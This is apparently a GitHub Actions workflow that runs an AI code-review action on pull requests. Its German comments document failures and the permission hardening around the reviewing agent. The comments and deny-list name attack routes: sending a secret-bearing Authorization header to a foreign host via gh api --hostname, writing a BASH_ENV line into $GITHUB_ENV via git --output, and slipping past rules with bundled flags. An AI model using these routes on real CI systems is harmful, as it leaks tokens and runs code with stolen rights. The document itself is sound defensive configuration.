name: Claude Code Review

on:
  pull_request:
    types: [opened, synchronize, ready_for_review, reopened]
    # Optional: Only run on specific file changes
    # paths:
    #   - "src/**/*.ts"
    #   - "src/**/*.tsx"
    #   - "src/**/*.js"
    #   - "src/**/*.jsx"

# EIN LAUF JE PR, UND ZWAR DER ZUM NEUESTEN STAND. Seit die Review jeden Push
# prueft (siehe die Aufhebung der Abbruchbedingung im Prompt), stehen sonst
# mehrere echte Laeufe gleichzeitig in der Luft: an #1066 lief einer 16m55s und
# lieferte seinen Befund zu einem Commit, der da schon zwei Pushes alt war. Ein
# abgebrochener Lauf endet als `cancelled`, nicht als gruener Haken - und der
# Nachweis-Schritt laesst ihn deshalb in Ruhe (er verlangt `outcome == success`).
concurrency:
  group: claude-review-pr-${{ github.event.pull_request.number }}
  cancel-in-progress: true

jobs:
  claude-review:
    if: github.event.pull_request.head.repo.full_name == github.repository
    # Optional: Filter by PR author
    # if: |
    #   github.event.pull_request.user.login == 'external-contributor' ||
    #   github.event.pull_request.user.login == 'new-developer' ||
    #   github.event.pull_request.author_association == 'FIRST_TIME_CONTRIBUTOR'

    runs-on: ubuntu-latest
    timeout-minutes: 30
    env:
      CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
    permissions:
      contents: read
      # write, sonst läuft das Review durch und kann sein Ergebnis nicht posten:
      # das Plugin schreibt über `gh pr comment`. Mit `read` endete der Job grün,
      # aber ohne jeden Kommentar (permission_denials_count: 1).
      pull-requests: write
      issues: read
      id-token: write

    steps:
      - name: Skip Claude Code Review when token is unavailable
        if: env.CLAUDE_CODE_OAUTH_TOKEN == ''
        run: echo "CLAUDE_CODE_OAUTH_TOKEN is not configured; skipping Claude Code Review."

      - name: Checkout repository
        if: env.CLAUDE_CODE_OAUTH_TOKEN != ''
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          fetch-depth: 1

      # WELCHER STAND STEHT ZUR PRUEFUNG? Der Schritt haelt den Laufbeginn fest.
      # Ab dieser Zeit gilt eine Aeusserung als moegliche Antwort DIESES Laufs -
      # und die Commit-SHA daneben entscheidet, ob sie es beweisbar ist.
      #
      # Vorher zaehlte der Nachweis ueber die ganze Lebensdauer des PR, und ein
      # einziger alter Kommentar faerbte damit jeden spaeteren Abbruch gruen. An
      # #1066 (09.09.2026) gingen so drei Pushes hintereinander ungeprueft durch:
      # Laeufe von 1m18s, 1m18s und 1m46s, jeder mit `num_turns: 3`, NULL
      # Verweigerungen und dem result-Text "Claude has already left a comment on
      # this PR ... I should stop here" - waehrend der Haken gruen stand.
      #
      # HIER STAND EINMAL EINE ABKUERZUNG FUER DEN RERUN-FALL: haengt am Head
      # schon eine claude-Aeusserung, spare die Review. Sie ist wieder draussen.
      # Ein Lauf, der EINE Inline-Anmerkung gepostet hat und dann in den Timeout
      # oder in den Abbruch lief, hinterlaesst genau diese eine Anmerkung - und
      # die Abkuerzung haette sie als Beweis genommen, dass der ganze Commit
      # geprueft sei. Der Rerun waere uebersprungen worden, der Nachweis mit ihm
      # (`outcome: skipped`), und der Haken gruen ueber einer abgebrochenen
      # Pruefung. Ein Rerun kostet jetzt eine zweite Review. Das ist der
      # billigere Fehler.
      - name: Welcher Stand steht zur Pruefung?
        id: stand
        if: env.CLAUDE_CODE_OAUTH_TOKEN != ''
        run: |
          set -euo pipefail
          # DER ANKER IST DER LAUFBEGINN, NICHT DIE COMMIT-ZEIT. Die Commit-Zeit
          # waere die naheliegende Wahl und ist die falsche: ein Commit entsteht
          # oft lange vor seinem Push. Wer B um 10:02 committet, um 10:08 die
          # Review zu A bekommt und B erst um 10:09 pusht, haette einen Kommentar
          # von 10:08 "nach" B liegen - und der Nachweis haette B fuer geprueft
          # gehalten. Genau diese Sorte stiller Verwechslung wird hier
          # abgeschafft und nicht in neuer Form wieder eingebaut.
          echo "seit=$(date -u +%Y-%m-%dT%H:%M:%SZ)" >> "$GITHUB_OUTPUT"

      # DER EIGENTLICHE FEHLER WAR NICHT DIE SPERRE, SONDERN DIE STILLE.
      #
      # Die Action endet mit Erfolg, wenn sie ohne Ausnahme durchläuft - ob die
      # Review dabei etwas gesagt hat, prüft niemand. So stand fünf PRs lang ein
      # grüner Haken für eine Prüfung, die nie stattgefunden hat, und ein grüner
      # Haken, der nichts misst, ist schlimmer als gar keiner: er lädt dazu ein,
      # sich auf ihn zu verlassen.
      #
      # Geprüft wird der WIRKUNG nach, nicht dem Ablauf: hat claude etwas
      # hinterlassen - Zusammenfassung, Review oder Inline-Anmerkung?
      #
      # ABER ZU WELCHEM STAND. Genau daran ist dieser Schritt bis zum 09.09.2026
      # blind gewesen: er zaehlte ueber die ganze Lebensdauer des PR und war
      # gruen, sobald irgendein claude-Kommentar existierte. Der Satz, der hier
      # stand - "der Lauf auf synchronize bleibt gruen, wenn schon ein Kommentar
      # von einem frueheren Lauf steht" - beschrieb die Luecke als Absicht. Sie
      # war keine: das Plugin brach ab, WEIL schon ein Kommentar stand, und
      # dieser selbe Kommentar faerbte den Abbruch dann gruen. Beide Seiten der
      # Zange hingen am selben Nagel.
      #
      # Jetzt zaehlt er nur, was NACH dem Beginn DIESES Laufs gesagt wurde, und
      # das Urteil faellt `.github/scripts/review-verdict.mjs` - ausserhalb des
      # Workflows, weil eine Urteilslogik, die nur hier lebt, nicht gegengeprobt
      # werden kann. `npm run test:review-proof` faehrt sie gegen die echten
      # Nutzdaten aus #1066 und #1029.
      #
      # AUSGENOMMEN: ein PR, der DIESE Datei aendert. Die Action prueft, ob der
      # Workflow im PR zeichengleich mit dem auf dem Default-Branch ist, und
      # ueberspringt sich sonst selbst - sonst koennte ein PR sich per
      # `claude_args` beliebige Werkzeuge freischalten und die Review gegen sich
      # selbst laufen lassen. Sie tut das mit `outcome=success`, also mit
      # demselben stillen Gruen, das dieser Schritt aufdeckt.
      #
      # Die Ausnahme hat ein Verfallsdatum: sie greift nur, solange die Fassung
      # im Branch von der auf dem Default-Branch abweicht. Sobald der PR gemergt
      # oder der Branch rebast ist, prueft die Review wieder scharf. Ohne sie
      # waere jede kuenftige Workflow-Aenderung automatisch rot, und eine
      # Ausnahme, die man wegklickt, ist bald keine mehr.
      #
      # ZWEI FAELLE, EIN KRITERIUM. Nicht nur ein PR, der diese Datei aendert,
      # weicht ab - auch ein Branch, der sie gar nicht anfasst, aber aelter ist
      # als die letzte Aenderung daran. Nach jedem Zug an dieser Datei ist das
      # schlagartig jeder offene Branch. Der Schritt prueft deshalb dasselbe wie
      # die Action, naemlich Zeichengleichheit, und sagt in der Notiz, welcher
      # der beiden Faelle vorliegt.
      - name: Prueft die Review-Datei sich selbst?
        id: self-edit
        if: env.CLAUDE_CODE_OAUTH_TOKEN != ''
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR: ${{ github.event.pull_request.number }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          BASIS: ${{ github.event.pull_request.base.sha }}
          BASIS_NAME: ${{ github.event.repository.default_branch }}
          DATEI: .github/workflows/claude-code-review.yml
        run: |
          set -euo pipefail
          # GEPRUEFT WIRD ZEICHENGLEICHHEIT, NICHT "der PR fasst die Datei an".
          # Hier stand vorher eine `gh api .../files | grep`-Probe, und die kannte
          # nur den einen Fall. Die Action selbst vergleicht aber den Inhalt gegen
          # den Default-Branch - und ein Branch, der diese Datei gar nicht anfasst,
          # aber VERALTET ist, faellt genauso hinein. Nach jeder Aenderung an dieser
          # Datei ist das schlagartig JEDER offene Branch: die Action uebersprang
          # sich, der Nachweis fand kein result-Objekt und waere rot geworden,
          # obwohl niemand etwas falsch gemacht hat. Blob-SHAs vergleichen ist
          # genau das Kriterium der Action, in einer Zeile.
          # DIESE AUSNAHME SCHLIESST ZU. Ein Ersatzwert bei Fehlschlag waere
          # bequem und genau falsch herum: zwei ungleiche Platzhalter haetten
          # `self=true` gesetzt, den Nachweis ausgesetzt und den Job gruen
          # gelassen - wegen eines 403 oder 5xx in einer DIAGNOSE-Abfrage. Wer
          # nicht beweisen kann, dass er ausgenommen ist, ist nicht ausgenommen.
          kopf=""; basis=""
          kopf=$(gh api "repos/$REPO/contents/$DATEI?ref=$HEAD_SHA" --jq '.sha') || kopf=""
          basis=$(gh api "repos/$REPO/contents/$DATEI?ref=$BASIS" --jq '.sha') || basis=""
          if [ -z "$kopf" ] || [ -z "$basis" ]; then
            echo "self=false" >> "$GITHUB_OUTPUT"
            echo "::warning::Die Fassung des Review-Workflows liess sich nicht auf" \
                 "beiden Seiten lesen (Kopf: '${kopf:-Fehler}', Basis: '${basis:-Fehler}')." \
                 "Die Selbst-Uebersprung-Ausnahme gilt deshalb NICHT - sie braucht" \
                 "zwei gelesene, wirklich verschiedene Fassungen. Der Nachweis laeuft."
          elif [ "$kopf" = "$basis" ]; then
            echo "self=false" >> "$GITHUB_OUTPUT"
            echo "Der Review-Workflow ist zeichengleich mit der Basis $BASIS ($kopf)."
          else
            echo "self=true" >> "$GITHUB_OUTPUT"
            if gh api "repos/$REPO/pulls/$PR/files" --paginate --jq '.[].filename' \
               | grep -qx "$DATEI"; then
              echo "::notice::Dieser PR aendert den Review-Workflow selbst." \
                   "Die Action ueberspringt sich dann aus Sicherheitsgruenden" \
                   "(Workflow-Validierung), also kann hier keine Review entstehen." \
                   "Der Nachweis ist ausgesetzt und greift ab dem naechsten PR wieder."
            else
              echo "::notice::Dieser Branch traegt eine andere Fassung des" \
                   "Review-Workflows als die Basis dieses PR, ohne sie selbst zu" \
                   "aendern - er ist also veraltet. Die Action ueberspringt sich" \
                   "deshalb, und der Nachweis ist ausgesetzt. Auf $BASIS_NAME rebasen," \
                   "dann prueft sie wieder scharf."
            fi
          fi

      - name: Run Claude Code Review
        if: env.CLAUDE_CODE_OAUTH_TOKEN != ''
        id: claude-review
        uses: anthropics/claude-code-action@d75b94d5ad426cb8546e6628b6f5f19b84e5cce1 # v1.0.216
        with:
          claude_code_oauth_token: ${{ env.CLAUDE_CODE_OAUTH_TOKEN }}
          plugin_marketplaces: 'https://github.com/anthropics/claude-code.git'
          plugins: 'code-review@claude-code-plugins'
          # DAUERHAFT AN, WEIL DER NACHWEIS-SCHRITT SONST NUR MELDET, DASS ETWAS
          # FEHLT, UND NIE WAS. Der Fehlertext unten schickt einen selbst hierher
          # ("mit show_full_output: true erneut laufen lassen") - das kostete
          # jedesmal einen zweiten Anlauf mit geaendertem Workflow, und genau der
          # ist der teuerste: ein PR, der DIESE Datei anfasst, laesst die Action
          # sich selbst ueberspringen (Workflow-Validierung, siehe der Schritt
          # "Prueft die Review-Datei sich selbst?"). Die Diagnose muss also immer
          # erst nach main, bevor sie ueberhaupt etwas messen kann.
          #
          # Der Anlass (PR #794, 2026-08-17): 14 Turns, `is_error: false`,
          # NULL Verweigerungen, kein Kommentar - ein Muster, das in keiner der
          # vier hier dokumentierten Runden vorkam, denn alle vorherigen
          # Fehlschlaege hatten Verweigerungen > 0. Ohne die volle Ausgabe ist
          # nicht zu sehen, was die Review in diesen 14 Turns getan hat.
          #
          # Kosten: laengere Job-Logs. Die faellt nur an, wenn jemand sie liest.
          show_full_output: true
          # `--comment` IST DER GRUND, WARUM SIE NIE ETWAS GESAGT HAT. Die
          # Anleitung des Plugins steuert das Posten ueber genau dieses Argument:
          #
          #   "If `--comment` argument was NOT provided, stop here.
          #    Do not post any GitHub comments."
          #
          # Ohne das Flag prueft es also vollstaendig und schweigt danach
          # absichtlich - genau das Bild, das die Laeufe zeigten: 20 Turns,
          # fuenf Minuten, `is_error: false`, kein Kommentar. Es war die ganze
          # Zeit gehorsam, nicht kaputt.
          #
          # Mit dem Flag postet es IMMER: eine Zusammenfassung, wenn es nichts
          # findet, und Inline-Anmerkungen, wenn doch. Erst dadurch wird der
          # Nachweis-Schritt weiter unten zu einer richtigen Zusicherung -
          # vorher haette er auch einen sauberen PR rot gefaerbt.
          # DIE ZWEITE ZEILE IST DER GRUND, WARUM SIE VIERMAL HINTEREINANDER
          # NICHTS HINTERLASSEN HAT (#865, 2026-08-25).
          #
          # Das Plugin arbeitet fast nur mit Subagenten ("Launch 4 agents in
          # parallel to review ..."), und die starten inzwischen ASYNCHRON. Im
          # Job-Log steht es woertlich:
          #
          #   "Async agent launched successfully ... The agent is working in the
          #    background. You will be notified automatically when it completes."
          #
          # In einer interaktiven Sitzung kommt diese Benachrichtigung als neuer
          # Turn zurueck. HIER GIBT ES KEINEN. Die Hauptsession sagt "ich warte"
          # und ist damit fertig - es gibt niemanden, der sie am Leben haelt,
          # also stirbt sie samt ihren Agenten, bevor irgendein Befund entsteht.
          # Genau dieser Satz stand in allen vier result-Objekten:
          #
          #   Lauf 1 (5 Turns):  "Waiting for both to complete before proceeding."
          #   Lauf 2 (56 Turns): "No action needed - I'll be notified automatically
          #                       when the two background review agents finish."
          #   Lauf 4 (7 Turns):  "I'll wait for both background agents to complete
          #                       before continuing."
          #
          # Reruns helfen deshalb nicht: die Ursache ist nicht sprunghaft,
          # sondern strukturell. Drei Anlaeufe gingen dafuer drauf, bevor das
          # Muster im result-Text auffiel - er ist das Erkennungsmerkmal,
          # nicht die Turn-Zahl und nicht die Verweigerungen (Lauf 2 hatte
          # welche, aber nur fuer `git clone`-Umwege, die mit der Pruefung
          # nichts zu tun haben).
          #
          # DIE ANWEISUNG STEHT IM PROMPT UND NICHT IN claude_args, weil es
          # kein Werkzeug-Problem ist: `Task` ist erlaubt und wird benutzt. Es
          # geht darum, WIE es benutzt wird.
          prompt: |
            /code-review:code-review ${{ github.repository }}/pull/${{ github.event.pull_request.number }} --comment

            Fahre jeden Subagenten SYNCHRON: setze `run_in_background: false` und
            warte sein Ergebnis ab, bevor du weitermachst. Dieser Lauf ist nicht
            interaktiv - eine Benachrichtigung ueber einen fertigen
            Hintergrund-Agenten trifft auf keinen Turn mehr und erreicht dich
            nie. Sobald du "ich warte auf die Agenten" denkst und nichts weiter
            tust, endet der Lauf, und die Pruefung hinterlaesst nichts.

            DIE ABBRUCHBEDINGUNG "Claude hat diesen PR schon kommentiert" GILT
            HIER NICHT. Sie ist fuer Repos gedacht, die eine Review je PR wollen;
            dieses will eine je Push. Zu pruefen ist der Stand
            ${{ github.event.pull_request.head.sha }}, und an genau diesem Commit
            haengt noch keine Review und keine Inline-Anmerkung von dir - der
            Schritt davor hat das gezaehlt, sonst liefst du gar nicht. Kommentare
            an FRUEHEREN Commits desselben PR sind also kein Grund aufzuhoeren,
            und eine aeltere Zusammenfassung ohne Commit-Bindung ("No issues
            found") ebenso wenig; sag stattdessen, was seither dazugekommen ist.
            Alle uebrigen Bedingungen aus Schritt 1 (geschlossen, Entwurf,
            automatisiert, trivial) bleiben unveraendert.

            Ein CLAUDE.md liegt im Checkout nicht (gitignored). Die Regeln dieses
            Repos stehen in CONTRIBUTING.md, und massgeblich ist die Fassung auf
            `${{ github.event.repository.default_branch }}`, nicht eine im PR
            geaenderte. Deren Abschnitt zu `claude-review` beschreibt auch, dass
            hier jeder Push geprueft wird.
          # KEINE WERKZEUG-ANWEISUNGEN IM PROMPT (11.09.2026, nach #1117). Dort
          # stand kurz ein Absatz, welche `gh api`- und git-Wege offen und welche
          # gesperrt sind. Die beiden Laeufe danach (#1116, #1114) hielten den
          # ganzen deutschen Block fuer eine eingeschleuste Anweisung - einer
          # zitierte woertlich "use gh api with unquoted paths" - und brachen im
          # Tor ab; von den 18 Laeufen davor tat das keiner. Was erlaubt ist, setzt
          # `claude_args` durch, nicht der Prompt. Der Verweis auf CONTRIBUTING.md
          # bleibt, weil er die Regel "jeder Push" an einer Stelle belegt, die die
          # Review selbst nachlesen kann: genau das vermisste sie ("no reliable way
          # to verify ... a per-push review policy").
          allowed_bots: 'dependabot[bot]'
          # DIESE LISTE ERSETZT, SIE ERGÄNZT NICHT. Das war die Annahme, die den
          # zweiten Anlauf gekostet hat: `--allowed-tools` verdrängt die acht
          # Werkzeuge, die das Plugin `code-review@claude-code-plugins` in seinem
          # Frontmatter deklariert. Sie müssen deshalb hier alle wieder auftauchen.
          #
          # Der Weg dahin, in Zahlen, damit die nächste Runde nicht wieder rät:
          #   #706, ohne diese Zeile:  10 Turns,  28 s, 5 Verweigerungen, nichts
          #                            gepostet. Es fehlte alles zum LESEN.
          #   #708, mit Read/Grep/Glob: 23 Turns, 4,5 min, 1 Verweigerung, immer
          #                            noch nichts gepostet. Die Review hat also
          #                            wirklich gearbeitet und ist erst am Ende
          #                            gescheitert - an `gh pr comment`, dem
          #                            einzigen Weg, ihr Ergebnis abzuliefern.
          #
          # `Skill` STEHT ZUERST, UND ZWAR AUS EINEM GRUND. Der Prompt ruft
          # `/code-review:code-review …` auf, und das ist ein Plugin-Kommando -
          # ohne das Skill-Werkzeug kann die Review ihr eigenes Kommando nicht
          # ausfuehren. Ein Diagnoselauf mit `show_full_output` hat es benannt:
          #
          #   "tool_use_result": "Error: Execute skill: code-review:code-review"
          #
          # Das war eine Regression aus dem ersten Anlauf: vor `claude_args` gab
          # es keine Liste, also war `Skill` da. Sie erklaert auch, warum die
          # Laeufe so sprunghaft aussahen - ohne ihr Kommando improvisierte das
          # Modell die Review, mal ueber 29 Turns mit Ergebnis, mal Abbruch nach
          # vier. Dieselbe Messung nannte `gh repo view` als zweiten Treffer.
          #
          # `Task` IST DER DRITTE GRUND, UND ER STAND DIE GANZE ZEIT IM PLUGIN.
          # Dessen Anleitung besteht fast nur aus Subagenten: "Launch a haiku
          # agent to check ...", "Launch 4 agents in parallel to review ...",
          # dazu je ein Bewertungs-Agent pro Befund - acht Starts und mehr pro
          # Lauf. Das Werkzeug dafuer fehlte in dieser Liste UND im Frontmatter
          # des Plugins, und weil die Liste ERSETZT, war jeder einzelne Start
          # gesperrt. Gemessen an den result-Objekten:
          #   #724 (10 Zeilen YAML):  14 Turns,  3 Verweigerungen, Kommentar da.
          #   #725 (413 Zeilen Lock): 24 Turns, 11 Verweigerungen, nichts.
          # Ohne Subagenten improvisiert das Modell die Review selbst. Bei einem
          # winzigen Diff geht das aus, bei einem grossen nicht - deshalb sah es
          # aus, als scheitere die Review an Lockfiles. Die Diffgroesse war nur
          # der Ausloeser, nicht die Ursache.
          #
          # Reihenfolge: Skill und Task zuerst (ohne die beiden kann die Review
          # weder ihr Kommando noch ihre Agenten starten), dann die acht des
          # Plugins, dann was es nicht deklariert, aber braucht. Read/Grep/Glob
          # geben ihr den Quelltext um den Diff herum; `git rev-parse` verlangt
          # seine eigene Anleitung für die SHA-gebundenen Codelinks.
          #
          # DER LESENDE REST, GEMESSEN STATT GERATEN (11.09.2026, #1116). Von den
          # letzten 40 Laeufen trugen 17 Verweigerungen, und sie fielen in wenige
          # Gruppen: die Diskussion am PR nachlesen (`gh api .../pulls/<n>/reviews`,
          # `.../comments`, `.../issues/<n>/comments`), Inhalte zu einem Stand holen
          # (`contents?ref=`, `compare`, `commits`) und git lesend benutzen
          # (`git show`, `git fetch origin <sha>`, `ls-files`, `cat-file`). Auf dem
          # zweiten Push eines PR will die Review zuerst wissen, was schon gesagt
          # wurde - an #1116 lief sie 14 Turns, sammelte 7 Verweigerungen und
          # konnte am Ende nichts abliefern.
          #
          # `gh api` IST NUR LESEND FREI, UND DAS HAELT DIE ZWEITE LISTE. Eine
          # Allow-Regel auf den Pfad laesst jede Schreibform mit durch, weil `*`
          # auch ` -X POST` oder ` -f body=...` trifft. Deny-Regeln gehen vor und
          # greifen an jeder Stelle des Befehls. Lokal gemessen (CLI 2.1.267, CI
          # 2.1.261) gegen PR 999999, damit ein Durchrutscher nur einen 404 traf:
          # mit beiden Listen lesend erlaubt; `-f`, `-F`, `--field`, `--raw-field`,
          # `-X POST`, `-XPOST`, `--method POST`, `--method=POST` und `--input`
          # gesperrt, auch mit dem Pfad in Anfuehrungszeichen. OHNE die Deny-Liste
          # liefen `-f` und `-X POST` durch - sie ist also tragend, nicht Zierde.
          # `gh api graphql` bleibt ganz draussen, es liegt nicht unter `repos/`.
          #
          # DIE REGEL MIT ANFUEHRUNGSZEICHEN IST KEIN DOPPEL. `gh api "repos/..."`
          # trifft die Regel ohne Zeichen nicht (gemessen), und einen Pfad mit `&`
          # in der Query muss man quoten, sonst schickt bash den Befehl in den
          # Hintergrund. Sie steht als eigener Wert in einfachen Anfuehrungszeichen:
          # die Action zerlegt `claude_args` mit shell-quote und sammelt alle Werte
          # hinter `--allowed-tools` ein, so braucht das `"` kein Escape.
          #
          # BEWUSST NICHT FREI: Code aus dem Checkout ausfuehren (`node`, `npm`,
          # Tests), `Write` und `WebFetch`. Die Laeufe haben alles davon versucht.
          # Der Job traegt aber CLAUDE_CODE_OAUTH_TOKEN, Schreibrecht auf Pull
          # Requests und OIDC, und der Checkout ist Code des PR - dieselbe Grenze,
          # aus der das Urteilsmodul unten von der Basis kommt. Die Tests laufen in
          # ci.yml.
          #
          # DIE DENY-LISTE DECKT MEHR ALS DIE OFFENSICHTLICHEN FORMEN (Review auf
          # #1117, am Werkzeug nachgemessen mit gh 2.100 und git 2.54):
          #   - `--hostname`: `gh api repos/... --hostname fremd -H "Authorization:
          #     ...$GEHEIMNIS"` schickt die Anfrage samt Kopfzeile an einen fremden
          #     Host. Das Flag hat keine Kurzform.
          #   - Gebuendelte Kurzflags: pflag liest `-iX GET` als `-i` plus `-X GET`
          #     (gemessen), also umgehen `-if body=...` und `-iX POST` die Regeln
          #     ` -f*` und ` -X*`. `-i` ist das einzige boolesche Kurzflag von
          #     `gh api`; ` -i*` schliesst die Buendel, `--include` bleibt frei.
          #   - `--output`: `git show`, `git log`, `git diff` und `git rev-list`
          #     schreiben damit eine Datei (gemessen) - etwa nach `$GITHUB_ENV`, und
          #     ein `BASH_ENV` darin liefe im naechsten Schritt mit dessen Tokens.
          #     Eine Abkuerzung wie `--outpu=` weist git zurueck. Beide Stellungen,
          #     direkt nach dem Befehl und weiter hinten, stehen einzeln da.
          #   - `git fetch`: `--upload-pack` waehlt das Programm der Gegenseite, und
          #     git nimmt die Abkuerzung `--upl=` an (gemessen), deshalb `--upl*`.
          #     `-u` ist bei fetch `--update-head-ok` und nimmt kein Argument. Beim
          #     https-Remote der CI bleibt das Flag ohnehin wirkungslos.
          # `--verbose` bleibt frei: gh druckt den Authorization-Kopf dabei nicht
          # (gemessen).
          claude_args: >-
            --allowed-tools
            "Skill,Task,Bash(gh issue view:*),Bash(gh search:*),Bash(gh issue list:*),Bash(gh pr comment:*),Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh pr list:*),Bash(gh repo view:*),mcp__github_inline_comment__create_inline_comment,Read,Grep,Glob,Bash(git rev-parse:*),Bash(git log:*),Bash(git diff:*),Bash(git show:*),Bash(git ls-files:*),Bash(git ls-tree:*),Bash(git cat-file:*),Bash(git rev-list:*),Bash(git blame:*),Bash(git merge-base:*),Bash(git status:*),Bash(git fetch origin:*),Bash(gh api repos/${{ github.repository }}/*)"
            'Bash(gh api "repos/${{ github.repository }}/*)'
            --disallowed-tools
            "Bash(gh api * -X*),Bash(gh api * --method*),Bash(gh api * -f*),Bash(gh api * -F*),Bash(gh api * --field*),Bash(gh api * --raw-field*),Bash(gh api * --input*),Bash(gh api * -i*),Bash(gh api * --hostname*),Bash(git fetch * --upl*),Bash(git show --output*),Bash(git show * --output*),Bash(git log --output*),Bash(git log * --output*),Bash(git diff --output*),Bash(git diff * --output*),Bash(git rev-list --output*),Bash(git rev-list * --output*)"
          # See https://github.com/anthropics/claude-code-action/blob/main/docs/usage.md
          # or https://code.claude.com/docs/en/cli-reference for available options

      - name: Die Review muss gesprochen haben
        # Entwurf und Bot-PR sind ausgenommen, weil das Plugin bei beiden
        # zugesichert abbricht - das ist "nichts zu pruefen" und kein Schweigen.
        # Sie stehen hier und nicht im Urteil, weil der Workflow sie sicher weiss,
        # waehrend das Urteil sie nur aus dem result-Text raten koennte.
        if: >-
          env.CLAUDE_CODE_OAUTH_TOKEN != ''
          && steps.claude-review.outcome == 'success'
          && steps.self-edit.outputs.self != 'true'
          && github.event.pull_request.draft != true
          && github.event.pull_request.user.type != 'Bot'
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          REPO: ${{ github.repository }}
          PR: ${{ github.event.pull_request.number }}
          SEIT: ${{ steps.stand.outputs.seit }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          BASIS: ${{ github.event.pull_request.base.sha }}
          URTEIL: .github/scripts/review-verdict.mjs
          EXECUTION_FILE: ${{ steps.claude-review.outputs.execution_file }}
        run: |
          set -euo pipefail
          # Hier wird nur noch geholt. `--paginate` mit einem jq, das ein Array
          # baut, druckt EINE Zeile JE SEITE - `$((a + b))` stirbt daran, sobald
          # ein PR ueber 30 Kommentare kommt. Deshalb ein Objekt je Zeile.
          # `commit` ist der Unterschied zwischen "jemand hat geredet" und
          # "zu DIESEM Commit wurde geredet". Reviews und Inline-Anmerkungen
          # tragen ihn, eine Zusammenfassung nicht - die bekommt `null`, und das
          # Urteil weiss dann, dass sie nur zaehlt, wenn das result-Objekt des
          # Laufs keinen Abbruch zeigt.
          # `anker` ist die Adresse, unter der eine Aeusserung selbst steht: das
          # Fragment ihrer `html_url` (issuecomment-..., pullrequestreview-...,
          # discussion_r...). Das Urteil haelt sie gegen die Adressen im Strom
          # des Laufs - ein Beleg ist eine Adresse, die dieser Lauf zurueckbekam
          # UND die hier als claude-Aeusserung nach dem Laufbeginn steht. Wie der
          # Befehl dazu geschrieben war, zaehlt dann nicht mehr (#1096).
          gh api "repos/$REPO/issues/$PR/comments" --paginate \
            --jq '.[] | {login: .user.login, zeit: .created_at, commit: null, anker: (.html_url // "" | split("#") | .[1] // null)}' \
            > "$RUNNER_TEMP/zusammenfassungen.jsonl"
          gh api "repos/$REPO/pulls/$PR/reviews" --paginate \
            --jq '.[] | {login: .user.login, zeit: (.submitted_at // ""), commit: .commit_id, anker: (.html_url // "" | split("#") | .[1] // null)}' \
            > "$RUNNER_TEMP/reviews.jsonl"
          gh api "repos/$REPO/pulls/$PR/comments" --paginate \
            --jq '.[] | {login: .user.login, zeit: .created_at, commit: (.original_commit_id // .commit_id), anker: (.html_url // "" | split("#") | .[1] // null)}' \
            > "$RUNNER_TEMP/inline.jsonl"
          # DAS URTEIL KOMMT VOM DEFAULT-BRANCH, NICHT AUS DEM PR. Hier stand
          # `node .github/scripts/review-verdict.mjs` aus dem Checkout - also
          # Code, den der PR selbst schreibt, ausgefuehrt in einem Job, der
          # CLAUDE_CODE_OAUTH_TOKEN, ein GH_TOKEN mit Schreibrecht auf Pull
          # Requests und OIDC im Ruecken hat. Ein PR haette damit beliebiges
          # JavaScript mit diesen Rechten laufen lassen koennen - und ganz
          # nebenbei sein eigenes Urteil auf gruen stellen. Die Ausnahme oben
          # vergleicht nur die Workflow-Datei und faengt das nicht.
          #
          # Der Schritt holt die Fassung vom Default-Branch und fuehrt DIE aus.
          # Ein PR, der das Urteil verbessert, wird also noch von der alten
          # Fassung beurteilt - genau so, wie die Action es mit dem Workflow
          # haelt. Faellt der Abruf aus, wird nicht geurteilt und nicht gruen
          # getan: ohne vertrauenswuerdigen Richter gibt es kein Urteil.
          BASIS_URTEIL="$RUNNER_TEMP/review-verdict-basis.mjs"
          if ! gh api "repos/$REPO/contents/$URTEIL?ref=$BASIS" \
               -H "Accept: application/vnd.github.raw" > "$BASIS_URTEIL" 2>/dev/null \
             || [ ! -s "$BASIS_URTEIL" ]; then
            echo "::error::Das Urteilsmodul liess sich nicht von $BASIS holen" \
                 "($URTEIL). Es aus dem PR-Checkout auszufuehren kommt nicht in Frage" \
                 "- das waere PR-eigener Code mit den Rechten dieses Jobs. Ohne" \
                 "vertrauenswuerdige Fassung gibt es kein Urteil und kein Gruen."
            exit 1
          fi
          node "$BASIS_URTEIL" \
            --seit "$SEIT" \
            --kopf "$HEAD_SHA" \
            --ergebnis "$EXECUTION_FILE" \
            --aeusserungen "$RUNNER_TEMP/zusammenfassungen.jsonl" \
            --aeusserungen "$RUNNER_TEMP/reviews.jsonl" \
            --aeusserungen "$RUNNER_TEMP/inline.jsonl"
